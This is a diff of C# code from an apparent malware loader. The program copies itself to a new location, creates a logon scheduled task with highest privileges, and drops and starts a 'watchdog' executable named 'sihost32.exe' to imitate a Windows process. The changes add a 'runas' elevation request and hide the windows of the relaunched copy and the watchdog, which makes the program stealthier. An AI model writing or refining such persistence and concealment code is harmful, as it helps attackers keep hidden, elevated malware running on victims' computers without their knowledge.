@@ -46,7 +46,8 @@ public partial class Program
                         FileName = "cmd",
                         Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(plp) + "\"" + " /tr " + "'" + "\"" + (plp) + "\"" + "' & exit",
                         WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true
+                        CreateNoWindow = true,
+                        Verb = "runas"
                     });
                 }
                 catch(Exception ex){
@@ -87,7 +88,12 @@ public partial class Program
             File.Copy(Process.GetCurrentProcess().MainModule.FileName, plp, true);
             Thread.Sleep(5 * 1000);
             RBaseFolder();
-            Process.Start(plp);
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = plp,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+            });
             Environment.Exit(0);
         }
     }
@@ -125,11 +131,16 @@ public partial class Program
             Thread.Sleep(3000);
             File.WriteAllBytes(bD + "sihost32.exe", RGetTheResource("#watchdog"));
 
-            Thread.Sleep(2 * 1000);
+            Thread.Sleep(1 * 1000);
 
             if (Process.GetProcessesByName("sihost32").Length < 1)
             {
-                Process.Start(bD + "sihost32.exe");
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = bD + "sihost32.exe",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                });
             }
 #endif
 
